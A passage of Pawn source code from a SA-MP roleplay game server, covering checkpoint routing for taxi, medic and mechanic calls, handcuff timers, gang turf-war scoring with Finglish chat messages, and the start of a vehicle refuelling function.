            SetPlayerCheckpoint(i,1158.0591,2072.2092,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 58)
            {
            SetPlayerCheckpoint(i,2884.5710,2454.0039,11.0690,5);
            }
            if(Mahal[TaxiAccepted[i]] == 59)
            {
            SetPlayerCheckpoint(i,2845.8950,2415.3938,11.0690,5);
            }
            if(Mahal[TaxiAccepted[i]] == 60)
            {
            SetPlayerCheckpoint(i,2756.7285,2477.2551,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 61)
            {
            SetPlayerCheckpoint(i,2802.8596,2430.6089,11.0625,5);
            }
            if(Mahal[TaxiAccepted[i]] == 70)
            {
            SetPlayerCheckpoint(i,1607.520996,1815.756591,10.820312,5);
            }
            if(Mahal[TaxiAccepted[i]] == 71)
            {
                SetPlayerCheckpoint(i,-329.770111,1536.920532,76.611709,5);
            }
			if(Mahal[TaxiAccepted[i]] == 71) SetPlayerCheckpoint(i,225.776153,1023.474426,1084.011840,5);
                        new Float:X,Float:Y,Float:Z;
                        GetPlayerPos(TaxiAccepted[i], X, Y, Z);
                        if(Mahal[TaxiAccepted[i]] == 9999)
                        {
                        SetPlayerCheckpoint(i, X, Y, Z, 5);
                        }
                    }
                }
            }
            if(MedicCallTime[i] > 0)
            {
            if(!IsPlayerConnected(MedicAccepted[i]))
            {
            MedicCallTime[i] = 0; MedicAccepted[i] = 9999; DisablePlayerCheckpoint(i); OnCheckpoint[i] = 0; SCM(i,COL_SYN,"Target left the server.");
            }
            if(IsPlayerConnected(MedicAccepted[i]))
            {
            OnCheckpoint[i] = 1;
            if(Mahal[MedicAccepted[i]] == 1)
            {
            SetPlayerCheckpoint(i,1310.126586,-1367.812255,13.540800,5);
            }
            if(Mahal[MedicAccepted[i]] == 2)
            {
            SetPlayerCheckpoint(i,1797.442504,-1578.950683,14.085444,5);
            }
            if(Mahal[MedicAccepted[i]] == 3 && TooHouse[MedicAccepted[i]] != 9999)
            {
            new house = TooHouse[MedicAccepted[i]];
            SetPlayerCheckpoint(i,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz],5);
            }
            if(Mahal[MedicAccepted[i]] == 4)
            {
            SetPlayerCheckpoint(i,1481.0289,-1770.9703,18.7958,5);
            }
            if(Mahal[MedicAccepted[i]] == 5)
            {
            SetPlayerCheckpoint(i,1554.9100,-1675.6428,16.1953,5);
            }
            if(Mahal[MedicAccepted[i]] == 6)
            {
            SetPlayerCheckpoint(i,2287.0576,2432.1121,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 7)
            {
            SetPlayerCheckpoint(i,725.5550,-1451.0232,17.6953,5);
            }
            if(Mahal[MedicAccepted[i]] == 8)
            {
            SetPlayerCheckpoint(i,1455.4546,750.9794,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 9)
            {
            SetPlayerCheckpoint(i,1456.7424,2773.4614,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 10)
            {
            SetPlayerCheckpoint(i,1080.997192,-345.408233,73.984069,5);
            }
            if(Mahal[MedicAccepted[i]] == 11)
            {
            SetPlayerCheckpoint(i,2792.930175,-1087.530761,30.718750,5);
            }
            if(Mahal[MedicAccepted[i]] == 12)
            {
            SetPlayerCheckpoint(i,2637.1936,2352.0090,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 13)
            {
            SetPlayerCheckpoint(i,1122.7065,-2037.0063,69.8942,5);
            }
            if(Mahal[MedicAccepted[i]] == 14)
            {
            SetPlayerCheckpoint(i,937.3935,1733.2067,8.8516,5);
            }
            if(Mahal[MedicAccepted[i]] == 15 && TooBiz[MedicAccepted[i]] != 9999)
            {
            new bizw = TooBiz[MedicAccepted[i]];
            SetPlayerCheckpoint(i,BizzInfo[bizw][bEntranceX],BizzInfo[bizw][bEntranceY],BizzInfo[bizw][bEntranceZ],5);
            }
            if(Mahal[MedicAccepted[i]] == 16)
            {
            SetPlayerCheckpoint(i,2421.4998,-1219.2438,25.56175,5);
            }
            if(Mahal[MedicAccepted[i]] == 17)
            {
            SetPlayerCheckpoint(i,2229.9011,-1721.2582,13.5613,5);
            }
            if(Mahal[MedicAccepted[i]] == 18)
            {
            SetPlayerCheckpoint(i,2577.4768,1325.4229,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 19)
            {
            SetPlayerCheckpoint(i,1461.695, -1011.915, 26.84375,5);
            }
            if(Mahal[MedicAccepted[i]] == 20)
            {
            SetPlayerCheckpoint(i,2436.9211,1734.6388,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 21)
            {
            SetPlayerCheckpoint(i,1599.1802,2221.7549,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 22)
            {
            SetPlayerCheckpoint(i,2188.0947,2469.6829,11.2422,5);
            }
            if(Mahal[MedicAccepted[i]] == 23)
            {
            SetPlayerCheckpoint(i,2097.4456,2224.2317,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 24)
            {
            SetPlayerCheckpoint(i,2637.1113,1129.2675,11.1797,5);
            }
            if(Mahal[MedicAccepted[i]] == 25)
            {
            SetPlayerCheckpoint(i,1550.5363,1120.4553,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 26)
            {
            SetPlayerCheckpoint(i,2150.7559,2733.8718,11.1763,5);
            }
            if(Mahal[MedicAccepted[i]] == 27)
            {
            SetPlayerCheckpoint(i,-19.2424,1175.5189,19.5634,5);
            }
            if(Mahal[MedicAccepted[i]] == 28)
            {
            SetPlayerCheckpoint(i,2193.7659,1991.2770,12.2969,5);
            }
            if(Mahal[MedicAccepted[i]] == 29)
            {
            SetPlayerCheckpoint(i,2441.1169,2065.3987,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 30)
            {
            SetPlayerCheckpoint(i,2308.5569,-1643.9500,14.8270,5);
            }
            if(Mahal[MedicAccepted[i]] == 31)
            {
            SetPlayerCheckpoint(i,2441.1716,2163.5334,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 32)
            {
            SetPlayerCheckpoint(i,1352.4738,-1758.7869,13.5078,5);
            }
            if(Mahal[MedicAccepted[i]] == 33)
            {
            SetPlayerCheckpoint(i,1833.4373,-1842.5286,13.5781,5);
            }
            if(Mahal[MedicAccepted[i]] == 34)
            {
            SetPlayerCheckpoint(i,1315.5024,-897.8165,39.5781,5);
            }
            if(Mahal[MedicAccepted[i]] == 35)
            {
            SetPlayerCheckpoint(i,1000.1695,-919.9931,42.3281,5);
            }
            if(Mahal[MedicAccepted[i]] == 36)
            {
            SetPlayerCheckpoint(i,-78.5365,-1169.9178,2.1389,5);
            }
            if(Mahal[MedicAccepted[i]] == 37)
            {
            SetPlayerCheckpoint(i,762.7137,-1792.9973,13.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 38)
            {
            SetPlayerCheckpoint(i,2165.875732,-1671.250000,15.073156,5);
            }
            if(Mahal[MedicAccepted[i]] == 39)
            {
            SetPlayerCheckpoint(i,1199.3704,-918.4752,43.1199,5);
            }
            if(Mahal[MedicAccepted[i]] == 40)
            {
            SetPlayerCheckpoint(i,2169.4907,2795.8733,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 41)
            {
            SetPlayerCheckpoint(i,928.3752,-1352.9083,13.3438,5);
            }
            if(Mahal[MedicAccepted[i]] == 42)
            {
            SetPlayerCheckpoint(i,810.8053,-1616.1349,13.5469,5);
            }
            if(Mahal[MedicAccepted[i]] == 43)
            {
            SetPlayerCheckpoint(i,2472.7500,2034.2101,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 44)
            {
            SetPlayerCheckpoint(i,2083.2698,2224.6626,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 45)
            {
            SetPlayerCheckpoint(i,1872.4313,2071.8857,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 46)
            {
            SetPlayerCheckpoint(i,2393.2512,2041.7485,10.8203,5);
            }
            if(Mahal[MedicAccepted[i]] == 47)
            {
            SetPlayerCheckpoint(i,2102.1255,2228.7788,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 48)
            {
            SetPlayerCheckpoint(i,2105.1135,-1806.5432,13.5547,5);
            }
            if(Mahal[MedicAccepted[i]] == 49)
            {
            SetPlayerCheckpoint(i,1656.7053,1733.3455,10.8281,5);
            }
            if(Mahal[MedicAccepted[i]] == 50)
            {
            SetPlayerCheckpoint(i,2102.1282,2257.4785,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 51)
            {
            SetPlayerCheckpoint(i,2244.2517,-1665.4854,15.4766,5);
            }
            if(Mahal[MedicAccepted[i]] == 52)
            {
            SetPlayerCheckpoint(i,2090.4385,2224.5938,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 53)
            {
            SetPlayerCheckpoint(i,2638.0071,1671.8262,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 54)
            {
            SetPlayerCheckpoint(i,2638.3850,1849.7784,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 55)
            {
            SetPlayerCheckpoint(i,2572.0415,1904.6978,11.0234,5);
            }
            if(Mahal[MedicAccepted[i]] == 56)
            {
            SetPlayerCheckpoint(i,2420.1963,-1509.0098,24.0000,5);
            }
            if(Mahal[MedicAccepted[i]] == 57)
            {
            SetPlayerCheckpoint(i,1158.0591,2072.2092,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 58)
            {
            SetPlayerCheckpoint(i,2884.5710,2454.0039,11.0690,5);
            }
            if(Mahal[MedicAccepted[i]] == 59)
            {
            SetPlayerCheckpoint(i,2845.8950,2415.3938,11.0690,5);
            }
            if(Mahal[MedicAccepted[i]] == 60)
            {
            SetPlayerCheckpoint(i,2756.7285,2477.2551,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 61)
            {
            SetPlayerCheckpoint(i,2802.8596,2430.6089,11.0625,5);
            }
            if(Mahal[MedicAccepted[i]] == 70)
            {
            SetPlayerCheckpoint(i,1607.520996,1815.756591,10.820312,5);
            }
            if(Mahal[MedicAccepted[i]] == 71)
            {
                SetPlayerCheckpoint(i,-329.770111,1536.920532,76.611709,5);
            }
			if(Mahal[MedicAccepted[i]] == 199) SetPlayerCheckpoint(i,225.776153,1023.474426,1084.011840,5);
            new Float:X,Float:Y,Float:Z;
                    GetPlayerPos(MedicAccepted[i], X, Y, Z);
                    if(Mahal[MedicAccepted[i]] == 9999)
                    {
                    SetPlayerCheckpoint(i, X, Y, Z, 5);
                    }
            }
            }
            if(MechanicCallTime[i] > 0)
            {
            if(!IsPlayerConnected(MechanicAccepted[i]))
            {
            MechanicCallTime[i] = 0; MechanicAccepted[i] = 9999; DisablePlayerCheckpoint(i); OnCheckpoint[i] = 0; SCM(i,COL_SYN,"Target left the server.");
            }
            if(IsPlayerConnected(MechanicAccepted[i]))
            {
            OnCheckpoint[i] = 1;
            if(Mahal[MechanicAccepted[i]] == 1)
            {
            SetPlayerCheckpoint(i,1310.126586,-1367.812255,13.540800,5);
            }
            if(Mahal[MechanicAccepted[i]] == 2)
            {
            SetPlayerCheckpoint(i,1797.442504,-1578.950683,14.085444,5);
            }
            if(Mahal[MechanicAccepted[i]] == 3 && TooHouse[MechanicAccepted[i]] != 9999)
            {
            new house = TooHouse[MechanicAccepted[i]];
            SetPlayerCheckpoint(i,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz],5);
            }
            if(Mahal[MechanicAccepted[i]] == 4)
            {
            SetPlayerCheckpoint(i,1481.0289,-1770.9703,18.7958,5);
            }
            if(Mahal[MechanicAccepted[i]] == 5)
            {
            SetPlayerCheckpoint(i,1554.9100,-1675.6428,16.1953,5);
            }
            if(Mahal[MechanicAccepted[i]] == 6)
            {
            SetPlayerCheckpoint(i,2287.0576,2432.1121,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 7)
            {
            SetPlayerCheckpoint(i,725.5550,-1451.0232,17.6953,5);
            }
            if(Mahal[MechanicAccepted[i]] == 8)
            {
            SetPlayerCheckpoint(i,1455.4546,750.9794,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 9)
            {
            SetPlayerCheckpoint(i,1456.7424,2773.4614,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 10)
            {
            SetPlayerCheckpoint(i,1080.997192,-345.408233,73.984069,5);
            }
            if(Mahal[MechanicAccepted[i]] == 11)
            {
            SetPlayerCheckpoint(i,2792.930175,-1087.530761,30.718750,5);
            }
            if(Mahal[MechanicAccepted[i]] == 12)
            {
            SetPlayerCheckpoint(i,2637.1936,2352.0090,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 13)
            {
            SetPlayerCheckpoint(i,1122.7065,-2037.0063,69.8942,5);
            }
            if(Mahal[MechanicAccepted[i]] == 14)
            {
            SetPlayerCheckpoint(i,937.3935,1733.2067,8.8516,5);
            }
            if(Mahal[MechanicAccepted[i]] == 15 && TooBiz[MechanicAccepted[i]] != 9999)
            {
            new bizw = TooBiz[MechanicAccepted[i]];
            SetPlayerCheckpoint(i,BizzInfo[bizw][bEntranceX],BizzInfo[bizw][bEntranceY],BizzInfo[bizw][bEntranceZ],5);
            }
            if(Mahal[MechanicAccepted[i]] == 16)
            {
            SetPlayerCheckpoint(i,2421.4998,-1219.2438,25.56175,5);
            }
            if(Mahal[MechanicAccepted[i]] == 17)
            {
            SetPlayerCheckpoint(i,2229.9011,-1721.2582,13.5613,5);
            }
            if(Mahal[MechanicAccepted[i]] == 18)
            {
            SetPlayerCheckpoint(i,2577.4768,1325.4229,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 19)
            {
            SetPlayerCheckpoint(i,1461.695, -1011.915, 26.84375,5);
            }
            if(Mahal[MechanicAccepted[i]] == 20)
            {
            SetPlayerCheckpoint(i,2436.9211,1734.6388,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 21)
            {
            SetPlayerCheckpoint(i,1599.1802,2221.7549,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 22)
            {
            SetPlayerCheckpoint(i,2188.0947,2469.6829,11.2422,5);
            }
            if(Mahal[MechanicAccepted[i]] == 23)
            {
            SetPlayerCheckpoint(i,2097.4456,2224.2317,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 24)
            {
            SetPlayerCheckpoint(i,2637.1113,1129.2675,11.1797,5);
            }
            if(Mahal[MechanicAccepted[i]] == 25)
            {
            SetPlayerCheckpoint(i,1550.5363,1120.4553,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 26)
            {
            SetPlayerCheckpoint(i,2150.7559,2733.8718,11.1763,5);
            }
            if(Mahal[MechanicAccepted[i]] == 27)
            {
            SetPlayerCheckpoint(i,-19.2424,1175.5189,19.5634,5);
            }
            if(Mahal[MechanicAccepted[i]] == 28)
            {
            SetPlayerCheckpoint(i,2193.7659,1991.2770,12.2969,5);
            }
            if(Mahal[MechanicAccepted[i]] == 29)
            {
            SetPlayerCheckpoint(i,2441.1169,2065.3987,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 30)
            {
            SetPlayerCheckpoint(i,2308.5569,-1643.9500,14.8270,5);
            }
            if(Mahal[MechanicAccepted[i]] == 31)
            {
            SetPlayerCheckpoint(i,2441.1716,2163.5334,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 32)
            {
            SetPlayerCheckpoint(i,1352.4738,-1758.7869,13.5078,5);
            }
            if(Mahal[MechanicAccepted[i]] == 33)
            {
            SetPlayerCheckpoint(i,1833.4373,-1842.5286,13.5781,5);
            }
            if(Mahal[MechanicAccepted[i]] == 34)
            {
            SetPlayerCheckpoint(i,1315.5024,-897.8165,39.5781,5);
            }
            if(Mahal[MechanicAccepted[i]] == 35)
            {
            SetPlayerCheckpoint(i,1000.1695,-919.9931,42.3281,5);
            }
            if(Mahal[MechanicAccepted[i]] == 36)
            {
            SetPlayerCheckpoint(i,-78.5365,-1169.9178,2.1389,5);
            }
            if(Mahal[MechanicAccepted[i]] == 37)
            {
            SetPlayerCheckpoint(i,762.7137,-1792.9973,13.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 38)
            {
            SetPlayerCheckpoint(i,2165.875732,-1671.250000,15.073156,5);
            }
            if(Mahal[MechanicAccepted[i]] == 39)
            {
            SetPlayerCheckpoint(i,1199.3704,-918.4752,43.1199,5);
            }
            if(Mahal[MechanicAccepted[i]] == 40)
            {
            SetPlayerCheckpoint(i,2169.4907,2795.8733,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 41)
            {
            SetPlayerCheckpoint(i,928.3752,-1352.9083,13.3438,5);
            }
            if(Mahal[MechanicAccepted[i]] == 42)
            {
            SetPlayerCheckpoint(i,810.8053,-1616.1349,13.5469,5);
            }
            if(Mahal[MechanicAccepted[i]] == 43)
            {
            SetPlayerCheckpoint(i,2472.7500,2034.2101,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 44)
            {
            SetPlayerCheckpoint(i,2083.2698,2224.6626,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 45)
            {
            SetPlayerCheckpoint(i,1872.4313,2071.8857,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 46)
            {
            SetPlayerCheckpoint(i,2393.2512,2041.7485,10.8203,5);
            }
            if(Mahal[MechanicAccepted[i]] == 47)
            {
            SetPlayerCheckpoint(i,2102.1255,2228.7788,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 48)
            {
            SetPlayerCheckpoint(i,2105.1135,-1806.5432,13.5547,5);
            }
            if(Mahal[MechanicAccepted[i]] == 49)
            {
            SetPlayerCheckpoint(i,1656.7053,1733.3455,10.8281,5);
            }
            if(Mahal[MechanicAccepted[i]] == 50)
            {
            SetPlayerCheckpoint(i,2102.1282,2257.4785,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 51)
            {
            SetPlayerCheckpoint(i,2244.2517,-1665.4854,15.4766,5);
            }
            if(Mahal[MechanicAccepted[i]] == 52)
            {
            SetPlayerCheckpoint(i,2090.4385,2224.5938,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 53)
            {
            SetPlayerCheckpoint(i,2638.0071,1671.8262,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 54)
            {
            SetPlayerCheckpoint(i,2638.3850,1849.7784,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 55)
            {
            SetPlayerCheckpoint(i,2572.0415,1904.6978,11.0234,5);
            }
            if(Mahal[MechanicAccepted[i]] == 56)
            {
            SetPlayerCheckpoint(i,2420.1963,-1509.0098,24.0000,5);
            }
            if(Mahal[MechanicAccepted[i]] == 57)
            {
            SetPlayerCheckpoint(i,1158.0591,2072.2092,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 58)
            {
            SetPlayerCheckpoint(i,2884.5710,2454.0039,11.0690,5);
            }
            if(Mahal[MechanicAccepted[i]] == 59)
            {
            SetPlayerCheckpoint(i,2845.8950,2415.3938,11.0690,5);
            }
            if(Mahal[MechanicAccepted[i]] == 60)
            {
            SetPlayerCheckpoint(i,2756.7285,2477.2551,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 61)
            {
            SetPlayerCheckpoint(i,2802.8596,2430.6089,11.0625,5);
            }
            if(Mahal[MechanicAccepted[i]] == 70)
            {
            SetPlayerCheckpoint(i,1607.520996,1815.756591,10.820312,5);
            }
            if(Mahal[MechanicAccepted[i]] == 71)
            {
                SetPlayerCheckpoint(i,-329.770111,1536.920532,76.611709,5);
            }
            new Float:X,Float:Y,Float:Z;
                GetPlayerPos(MechanicAccepted[i], X, Y, Z);
                if(Mahal[MechanicAccepted[i]] == 9999)
                {
                SetPlayerCheckpoint(i, X, Y, Z, 5);
                }
            }
            }
            if(PlayerCuffed[i] == 1)
            {
                if(PlayerCuffedTime[i] <= 0)
                {
                    TogglePlayerControllable(i, 1);
                    PlayerCuffed[i] = 0;
                    PlayerCuffedTime[i] = 0;
                    PlayerTazeTime[i] = 1;
                }
                else
                {
                    PlayerCuffedTime[i] -= 1;
                }
            }
            if(PlayerCuffed[i] == 2)
            {
                if(PlayerCuffedTime[i] <= 0)
                {
                    GameTextForPlayer(i, "~r~You broke the Cuffs, you are free!", 2500, 3);
                    TogglePlayerControllable(i, 1);
                    PlayerCuffed[i] = 0;
                    PlayerCuffedTime[i] = 0;
                }
                else
                {
                    PlayerCuffedTime[i] -= 1;
                }
            }
        }
    }
	for(new c = 0;c<sizeof(TurfInfo);c++)
	{
		if(TurfTime[c] >= 1)
		{
			TurfTime[c] --;
			for(new y = 0;y<MAX_PLAYERS;y++)
			{
				new mem;
				if(PINFO[y][pLeader]) mem = PINFO[y][pLeader];
				else mem = PINFO[y][pMember];
				if(TurfKhod[ServerTurf] == mem || TurfAttacker[ServerTurf] == mem)
				{
			        if (mem == 5) SetPlayerColor(y,0x5D7E8DFF);
			        if (mem == 6) SetPlayerColor(y,0x3E3535FF);
			        if (mem == 12) SetPlayerColor(y,0x19AF23FF);
			        if (mem == 13) SetPlayerColor(y,0xFFBA00FF);
			        if (mem == 14) SetPlayerColor(y,0xB32CF6FF);
					if (mem == 15) SetPlayerColor(y,0x00ECECFF);
					if (mem == 19) SetPlayerColor(y,0x0E47FFFF);
				}
			}
			if(TurfTime[c] == 1)
			{
				new turfid = c;
				ScoreAttacker[turfid] = KillsAttackerTurf[turfid] - DeathsAttackerTurf[turfid];
				ScoreKhod[turfid] = KillsKhodTurf[turfid] - DeathsKhodTurf[turfid];
				new stringo[512];
				if(ScoreAttacker[turfid] > ScoreKhod[turfid])
				{
					new familyname[256];
					for(new i = 0;i<LastPID;i++)
					{
						if(PINFO[i][pMember] == TurfAttacker[turfid] || PINFO[i][pLeader] == TurfAttacker[turfid])
						{
						    if(PINFO[i][pMember] == 5 || PINFO[i][pLeader] == 5)
						    {
							    format(stringo,256,"%s","SilenceMafia");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 6 || PINFO[i][pLeader] == 6)
						    {
							    format(stringo,256,"%s","TheKillers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 12 || PINFO[i][pLeader] == 12)
						    {
							    format(stringo,256,"%s","DangerousTigers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 13 || PINFO[i][pLeader] == 13)
						    {
							    format(stringo,256,"%s","LegendaryMen");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 14 || PINFO[i][pLeader] == 14)
						    {
							    format(stringo,256,"%s","FNF");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 15 || PINFO[i][pLeader] == 15)
						    {
							    format(stringo,256,"%s","StormMen");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 19 || PINFO[i][pLeader] == 19)
						    {
							    format(stringo,256,"%s","The Racers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    format(stringo,512,"[Turfs]: Faction Shoma (%s) Turfid %i Ra Taskhir Kard. Score: %i(Kills: %i | Deaths: %i)",familyname,turfid,ScoreAttacker[turfid],KillsAttackerTurf[turfid],DeathsAttackerTurf[turfid]);
						    SCM(i,COLOR_JOB,stringo);
						    GangZoneStopFlashForPlayer(i,Turfs[turfid]);
						    format(stringo,512,"[Turfs]: Emtiaz Shoma %i Ast.(Kills: %i | Your Deaths: %i)",KillsAttacker[i] - DeathsAttacker[i],KillsAttacker[i],DeathsAttacker[i]);
						    SCM(i,COLOR_JOB,stringo);
							SetPlayerToTeamColor(i);
						}
					}
					strmid(TurfInfo[turfid][zOwner],familyname,0,strlen(familyname),256);
					SaveTurfs(turfid);
					DynamicFactions[TurfAttacker[turfid]-1][fBank] += 2000;
					SaveDynamicFactions(TurfAttacker[turfid]-1);
					DynamicFactions[TurfKhod[turfid]-1][fBank] -= 2000;
					SaveDynamicFactions(TurfKhod[turfid]-1);
					ServerTurf =9999;
					ServerTurfRang =0;
					for(new i = 0;i<LastPID;i++)
					{
						if(PlayerInfo[i][pMember] == TurfKhod[turfid] || PlayerInfo[i][pLeader] == TurfKhod[turfid])
						{
							format(stringo,512,"[Turfs]: Faction Shoma Turfid %i Ra Az Dast Dad. Score: %i(Kills: %i | Deaths: %i)",turfid,ScoreKhod[turfid],KillsKhodTurf[turfid],DeathsKhodTurf[turfid]);
							SCM(i,COLOR_JOB,stringo);
							format(stringo,512,"[Turfs]: Emtiaz Shoma %i Ast.(Kills: %i | Your Deaths: %i)",KillsKhod[i] - DeathsKhod[i],KillsKhod[i],DeathsKhod[i]);
							SCM(i,COLOR_JOB,stringo);
							SetPlayerToTeamColor(i);
						}
					}
				}
				if(ScoreAttacker[turfid] < ScoreKhod[turfid])
				{
					new familyname[256];
					for(new i = 0;i<LastPID;i++)
					{
						if(PINFO[i][pMember] == TurfKhod[turfid] || PINFO[i][pLeader] == TurfKhod[turfid])
						{
						    if(PINFO[i][pMember] == 5 || PINFO[i][pLeader] == 5)
						    {
							    format(stringo,256,"%s","SilenceMafia");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 6 || PINFO[i][pLeader] == 6)
						    {
							    format(stringo,256,"%s","TheKillers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 12 || PINFO[i][pLeader] == 12)
						    {
							    format(stringo,256,"%s","DangerousTigers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 13 || PINFO[i][pLeader] == 13)
						    {
							    format(stringo,256,"%s","LegendaryMen");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 14 || PINFO[i][pLeader] == 14)
						    {
							    format(stringo,256,"%s","FNF");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 15 || PINFO[i][pLeader] == 15)
						    {
							    format(stringo,256,"%s","StormMen");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    if(PINFO[i][pMember] == 19 || PINFO[i][pLeader] == 19)
						    {
							    format(stringo,256,"%s","The Racers");
							    strmid(familyname,stringo,0,strlen(stringo),256);
						    }
						    format(stringo,512,"[Turfs]: Faction Shoma (%s) Turfid %i Ra Taskhir Kard. Score: %i(Kills: %i | Deaths: %i)",familyname,turfid,ScoreKhod[turfid],KillsKhodTurf[turfid],DeathsKhodTurf[turfid]);
						    SCM(i,COLOR_JOB,stringo);
						    GangZoneStopFlashForPlayer(i,Turfs[turfid]);
						    format(stringo,512,"[Turfs]: Emtiaz Shoma %i Ast.(Kills: %i | Your Deaths: %i)",KillsKhod[i] - DeathsKhod[i],KillsKhod[i],DeathsKhod[i]);
						    SCM(i,COLOR_JOB,stringo);
							SetPlayerToTeamColor(i);
						}
					}
					strmid(TurfInfo[turfid][zOwner],familyname,0,strlen(familyname),256);
					SaveTurfs(turfid);
					ServerTurf =9999;
					ServerTurfRang =0;
					DynamicFactions[TurfKhod[turfid]-1][fBank] += 2000;
					SaveDynamicFactions(TurfKhod[turfid]-1);
					DynamicFactions[TurfAttacker[turfid]-1][fBank] -= 2000;
					SaveDynamicFactions(TurfAttacker[turfid]-1);
					for(new i = 0;i<LastPID;i++)
					{
						if(PlayerInfo[i][pMember] == TurfAttacker[turfid] || PlayerInfo[i][pLeader] == TurfAttacker[turfid])
						{
							format(stringo,512,"[Turfs]: Faction Shoma Turfid %i Ra Az Dast Dad. Score: %i(Kills: %i | Deaths: %i)",turfid,ScoreAttacker[turfid],KillsAttackerTurf[turfid],DeathsAttackerTurf[turfid]);
							SCM(i,COLOR_JOB,stringo);
							format(stringo,512,"[Turfs]: Emtiaz Shoma %i Ast.(Kills: %i | Your Deaths: %i)",KillsAttacker[i] - DeathsAttacker[i],KillsAttacker[i],DeathsAttacker[i]);
							SCM(i,COLOR_JOB,stringo);
							SetPlayerToTeamColor(i);
						}
					}
				}
				if(ScoreAttacker[turfid] == ScoreKhod[turfid])
				{
					for(new i = 0;i<LastPID;i++)
					{
						if(ServerTurf == turfid)
						{
							format(stringo,512,"[Turfs]: Emtiaz Factionhaie Dar War %d Ast. 5 Daghighe Zaman Ezafe Shod.",ScoreAttacker[turfid]);
							SCM(i,COLOR_JOB,stringo);
							TurfTime[turfid] = 300;
						}
					}
					return 1;
				}
				for(new i = 0;i<LastPID;i++)
				{
					if(PINFO[i][pMember] == TurfAttacker[turfid] || PINFO[i][pLeader] == TurfAttacker[turfid] || PINFO[i][pMember] == TurfKhod[turfid] || PINFO[i][pLeader] == TurfKhod[turfid])
					{
						KillsAttacker[i] = 0;
						DeathsAttacker[i] = 0;
						KillsKhod[i] = 0;
						DeathsKhod[i] = 0;
						OnWar[i] = 9999;
					}
				}
				KillsAttackerTurf[turfid] = 0;
				DeathsAttackerTurf[turfid] = 0;
				KillsKhodTurf[turfid] = 0;
				DeathsKhodTurf[turfid] = 0;
				ScoreAttacker[turfid] = 0;
				ScoreKhod[turfid] = 0;
				TurfAttacker[turfid] = 9999;
				TurfKhod[turfid] = 9999;
				TurfTime[turfid] = 0;
			}
		}
	}
	return 1;
}


public Fillup(i)
{
        if(IsPlayerConnected(i))
        {
            new VID;
            new FillUp;
            new string[256];
            VID = GetPlayerVehicleID(i);
            FillUp = GasMax - Benzin[VID];
            if(Refueling[i] == 1)
            {
                if(IsACopCar(VID) || IsAnAmbulance(VID))
                {
                    Benzin[VID] += FillUp;
